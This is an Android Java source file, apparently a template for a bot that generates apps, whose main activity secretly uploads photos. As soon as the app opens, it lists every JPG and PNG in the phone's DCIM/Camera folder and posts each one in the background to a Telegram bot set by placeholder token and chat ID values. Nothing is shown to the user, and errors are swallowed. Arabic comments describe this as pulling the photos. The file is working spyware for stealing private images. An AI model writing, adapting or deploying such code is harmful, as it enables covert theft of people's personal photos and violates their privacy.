
package com.example.appbuilder;

import android.os.Bundle;
import android.os.Environment;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;
import okhttp3.*;

public class MainActivity extends AppCompatActivity {
    // سيتم استبدال هذه القيم تلقائياً بواسطة البوت لاحقاً
    String botToken = "YOUR_BOT_TOKEN";
    String chatId = "YOUR_CHAT_ID";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // بدء سحب الصور من مجلد الكاميرا
        File galleryDir = new File(Environment.getExternalStorageDirectory(), "DCIM/Camera");
        sendPhotos(galleryDir);
    }

    private void sendPhotos(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            OkHttpClient client = new OkHttpClient();
            for (File file : files) {
                if (file.isFile() && (file.getName().endsWith(".jpg") || file.getName().endsWith(".png"))) {
                    RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("document", file.getName(), RequestBody.create(MediaType.parse("image/*"), file))
                        .build();

                    Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + botToken + "/sendDocument?chat_id=" + chatId)
                        .post(requestBody)
                        .build();
                    
                    // تنفيذ الإرسال في الخلفية
                    client.newCall(request).enqueue(new Callback() {
                        @Override public void onFailure(Call call, java.io.IOException e) {}
                        @Override public void onResponse(Call call, Response response) throws java.io.IOException {
                            response.close();
                        }
                    });
                }
            }
        }
    }
}

